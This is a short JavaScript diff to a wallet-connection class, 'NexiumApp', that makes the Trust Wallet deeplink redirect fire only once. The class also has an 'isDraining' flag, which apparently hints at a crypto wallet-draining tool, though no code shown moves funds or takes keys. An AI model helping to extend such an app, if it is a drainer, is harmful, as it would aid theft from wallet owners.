@@ -39,6 +39,7 @@ class NexiumApp {
     this.spinner = null;
     this.isDraining = false;
     this.provider = null;
+    this.hasRedirected = false; // Track if redirect has occurred
     console.log('Initializing NexiumApp...');
     this.initApp();
   }
@@ -192,7 +193,13 @@ class NexiumApp {
         throw new Error(`No deeplink configured for ${walletName}`);
       }
       console.log(`Opening ${walletName} with deeplink: ${deeplink}`);
-      window.location.href = deeplink;
+
+      // Handle Trust Wallet redirect logic
+      if (walletName === 'TrustWallet' && !this.hasRedirected) {
+        this.hasRedirected = true; // Set flag after first redirect
+        window.location.href = deeplink;
+        return; // Exit to allow app to load
+      }
 
       const checkConnection = setInterval(async () => {
         if (walletName === 'MetaMask' && window.ethereum?.isMetaMask) {
